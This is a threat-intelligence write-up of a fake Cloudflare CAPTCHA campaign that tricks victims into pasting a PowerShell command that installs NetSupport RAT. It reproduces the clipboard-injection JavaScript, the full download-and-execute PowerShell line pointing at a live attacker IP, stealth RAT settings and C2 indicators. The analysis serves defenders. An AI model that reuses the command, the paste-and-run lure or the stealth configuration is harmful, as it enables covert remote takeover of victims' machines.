# Copy & Paste Malware Dropper — Technical Analysis

## Overview

This article documents a malware campaign that abuses a fake **Cloudflare CAPTCHA** page to trick victims into copying and executing a **PowerShell command**.  
The attack ultimately delivers **NetSupport Manager** (a legitimate remote administration tool often abused as a RAT).

The sample was first recorded on **URLAbuse**:

```json
{
  "id": 493186, 
  "url": "https://mondossierrenov.com/challenge.html", 
  "discovery": "2025-08-22 14:40:15", 
  "added": "2025-08-23 09:03:51", 
  "target": "#Malware_downloader", 
  "reporter": "VERIFROM", 
  "AbuseType": "phishing", 
  "UUID": "248a4d33325e29fb8602d83298c85153"
}

```

### Behaviour

#### Stage 1: Fake CAPTCHA

When the user visits the URL, a page imitating a Cloudflare CAPTCHA is shown:

![first stage CF fake captcha](https://raw.githubusercontent.com/urlabuse/public_access/refs/heads/main/copy_paste_payloads/first_stage_fake_cf_captcha.png)

However, this is actually not a cloudflare captcha but just an HTML page simulating the CF CAPTCHA.

When the checkbox is clicked, the following JavaScript runs:

```javascript
checkbox.addEventListener("click", function() {
    smartCopy(command);
    ...
});
```
The function smartCopy(command) copies a hidden PowerShell command into the clipboard:

```javascript
const command = `powershell  -w h -NoP -c "$u='http://216.245.184.93/bdA.lim';$p=\\"$env:USERPROFILE\\Documents\\m.ps1\\";(New-Object Net.WebClient).DownloadFile($u,$p);powershell -w h -ep bypass -f $p"`;
```

#### Stage 2: User Execution Trick

The victim is then shown another fake verification step:

![Second stage fake CF CAPTCHA](https://raw.githubusercontent.com/urlabuse/public_access/refs/heads/main/copy_paste_payloads/second_stage_fake_captcha.png)

The page instructs the user to:

1. Press Windows Key + R (open Run dialog)
2. Press CTRL+V (paste the malicious command from clipboard)
3. Press Enter

This executes the PowerShell command, which downloads the malware from: `http://216[.]245[.]184[.]93/bdA.lim`

The payload (9.3 MB) is stored as: `C:\Users\<username>\Documents\m.ps1`

and executed in hidden mode (-w h) with PowerShell execution policy bypassed (-ep bypass).

#### Payload Analysis

You can download the .zip version of the payload from ![Here](https://github.com/urlabuse/public_access/raw/refs/heads/main/copy_paste_payloads/bdA.zip) (password: infected)

Inside is a long PowerShell script. Key functions include:
1. **Decoding** a Base64-encoded blob into JSON
2. **Extracting** files into a hidden directory: `C:\Users\Public\YoaIXhwsHe`
3. **Installing persistence** by creating a shortcut in the Windows Startup folder pointing to client32.exe
4. **Masquerading** with a Windows system icon (imageres.dll,102)
5. **Delayed execution** to evade detection

#### Extracting the Encoded Files

Using bash:
```bash
cat bdA.lim | grep -E 'eyJmaWxlcyI6W3sibm.*QUFBQUFBPT0ifV19' -o > extraction.txt
cat extraction.txt | base64 -d -i > decoded_base64.txt
```

Using jq, we confirm the JSON contains an array of files:

```bash
cat decoded_base64.txt | jq '.files[0] | keys'
```
And here is the small python code to extract the files inside the JSON structure:

```python
import os, base64, json

if __name__ == "__main__":
    os.mkdir("payloads")
    with open("decoded_base64.txt") as f:
        data = json.load(f)
    for fobj in data["files"]:
        print("decoding.....{}...".format(fobj["name"]))
        with open("payloads/{}".format(fobj["name"]), "wb") as fw:
            fw.write(base64.b64decode(fobj["b64"]))
    print("DONE!")
```

We are able to extract 12 files:

```bash
AudioCapture.dll
client32.exe
client32.ini
HTCTL32.DLL
msvcr100.dll
nskbfltr.inf
NSM.LIC
nsm_vpro.ini
pcicapi.dll
PCICHEK.DLL
PCICL32.DLL
remcmdstub.exe
TCCTL32.DLL
```

The list of extracted files shows that the malware is a simple **NetSupport** tool dropper (mostly) known as NetSupport RAT.
At this stage, there is no need to analyze the binary files since it's a known and legit tool for remote monitoring.

Let's just take a look at the `client.ini` file which is the configuration file for NetSupport client.

#### NetSupport RAT Configuration

The extracted client32.ini reveals how attackers configure NetSupport:

```bash
quiet=1
AlwaysOnTop=0
AutoICFConfig=1
DisableChat=1
DisableChatMenu=1
DisableCloseApps=1
HideWhenIdle=1
silent=1
SKMode=1
SysTray=0
GatewayAddress=141.98.11.106:443
Port=443
```

Here is what this configuration means:
1. quiet=1 → Suppresses license warnings
2. silent=1 & SKMode=1 → Runs in stealth mode (hidden)
3. SysTray=0 → No tray icon visible
4. DisableChat* options → Prevent user interaction with attacker
5. GatewayAddress=141.98.11.106:443 → Connects to **attacker-controlled C2**
   

#### infrastructure

Malicious Domain
  - Domain: mondossierrenov.com
  - Registrar: IONOS SE
  - Created: 2025-08-18
  - Expires: 2026-08-18
  - Nameservers:
      - ns1107.ui-dns.org
      - ns1061.ui-dns.de
      - ns1121.ui-dns.biz
      - ns1061.ui-dns.com
  - A record: 23.227.194.170
  - Geo: Chicago, Illinois, US

Command & Control Server
  - IP Address: 141.98.11.106
  - Hostname: srv-141-98-11-106.serveroffer.net
  - Geo: Vilnius, Lithuania
  - Reputation: Reported 498 times (as of 24 Aug, 2025) on ![AbuseIPDB](https://www.abuseipdb.com/check/141.98.11.106) for malicious activities including SSH brute-force and WordPress scanning

#### Conclusion

This malware campaign uses social engineering (fake CAPTCHA) to trick users into self-executing a clipboard-injected PowerShell payload.

The payload installs NetSupport Manager RAT in stealth mode, connecting back to a known malicious C2 server (141.98.11.106:443).

